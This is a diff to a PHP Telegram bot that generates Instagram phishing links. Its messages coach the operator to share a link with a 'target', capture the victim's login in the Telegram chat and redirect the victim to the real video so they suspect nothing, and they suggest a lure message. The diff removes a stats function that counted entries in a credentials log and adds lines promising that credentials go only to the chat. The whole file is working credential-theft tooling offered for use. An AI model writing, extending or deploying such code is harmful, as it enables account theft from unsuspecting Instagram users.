@@ -49,12 +49,11 @@ if ($text === '/start') {
     $welcome .= "1. Send me a real Instagram video/reel/post URL\n";
     $welcome .= "2. I'll generate a phishing link for you\n";
     $welcome .= "3. Share that link with your target\n";
-    $welcome .= "4. They login → You get credentials → They watch the real video!\n\n";
+    $welcome .= "4. They login → You get credentials HERE → They watch the real video!\n\n";
     $welcome .= "📝 *Commands:*\n";
     $welcome .= "/start - Show this message\n";
-    $welcome .= "/generate - Generate random phishing link\n";
-    $welcome .= "/stats - View statistics\n";
     $welcome .= "/help - Show help\n\n";
+    $welcome .= "🔒 *All credentials are sent ONLY to this chat!*\n\n";
     $welcome .= "🔗 *Send me an Instagram link to get started!*\n";
     $welcome .= "Example: `https://www.instagram.com/reel/ABC123/`";
     
@@ -71,28 +70,12 @@ elseif ($text === '/help') {
     $help .= "*What happens when victim clicks:*\n";
     $help .= "1. Sees Instagram login page\n";
     $help .= "2. Enters credentials\n";
-    $help .= "3. You receive their login info! 🎯\n";
+    $help .= "3. You receive their login info HERE! 🎯\n";
     $help .= "4. They get redirected to the REAL video!\n\n";
+    $help .= "🔒 *Credentials are sent ONLY to this Telegram chat*\n";
     $help .= "✅ Victim thinks it worked normally!";
     
     sendMessage($chat_id, $help, $telegram_bot_token);
-}
-elseif ($text === '/generate') {
-    $response = "⚠️ *Please send a real Instagram link instead!*\n\n";
-    $response .= "Example:\n";
-    $response .= "`https://www.instagram.com/reel/ABC123/`\n\n";
-    $response .= "This way, after login, the victim will see the actual video and won't suspect anything! 🎯";
-    
-    sendMessage($chat_id, $response, $telegram_bot_token);
-}
-elseif ($text === '/stats') {
-    $stats = getStats();
-    $response = "📊 *Statistics*\n\n";
-    $response .= "👥 Total Captures: {$stats['total']}\n";
-    $response .= "📅 Today: {$stats['today']}\n";
-    $response .= "🕐 Last capture: {$stats['last']}";
-    
-    sendMessage($chat_id, $response, $telegram_bot_token);
 }
 else {
     // Check if it's an Instagram URL
@@ -106,8 +89,9 @@ else {
         $response .= "✨ *What happens:*\n";
         $response .= "1. Victim clicks your link\n";
         $response .= "2. Sees Instagram login page\n";
-        $response .= "3. Enters credentials → You receive them!\n";
+        $response .= "3. Enters credentials → You receive them HERE!\n";
         $response .= "4. Victim watches the real video 🎥\n\n";
+        $response .= "🔒 *Credentials sent ONLY to this chat*\n\n";
         $response .= "💬 *Suggested message:*\n";
         $response .= "\"_Hey! Is this you in this video?_ 😱\"\n\n";
         $response .= "⚡ Link is ready to use!";
@@ -146,14 +130,12 @@ function generatePhishingLink($base_url, $original_url) {
     preg_match('/\/(p|reel|tv|reels)\/([a-zA-Z0-9_-]+)/i', $original_url, $matches);
     
     $type = $matches[1] ?? 'reel';
-    $original_id = $matches[2] ?? '';
     
     // Normalize type
     if ($type === 'reels') $type = 'reel';
     
-    // Generate a unique ID that encodes the original URL
-    $encoded = base64_encode($original_url);
-    $short_code = substr(md5($encoded . time()), 0, 11);
+    // Generate a unique ID
+    $short_code = substr(md5($original_url . time() . rand()), 0, 11);
     
     // Store the mapping
     storeUrlMapping($short_code, $original_url);
@@ -194,35 +176,6 @@ function sendMessage($chat_id, $text, $token) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
-}
-
-function getStats() {
-    $log_file = __DIR__ . "/credentials_log.txt";
-    $stats = [
-        'total' => 0,
-        'today' => 0,
-        'last' => 'Never'
-    ];
-    
-    if (file_exists($log_file)) {
-        $lines = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $stats['total'] = count($lines);
-        
-        $today = date('Y-m-d');
-        foreach ($lines as $line) {
-            if (strpos($line, $today) !== false) {
-                $stats['today']++;
-            }
-        }
-        
-        if (count($lines) > 0) {
-            $last_line = end($lines);
-            preg_match('/\[(.*?)\]/', $last_line, $matches);
-            $stats['last'] = $matches[1] ?? 'Unknown';
-        }
-    }
-    
-    return $stats;
 }
 
 ?>
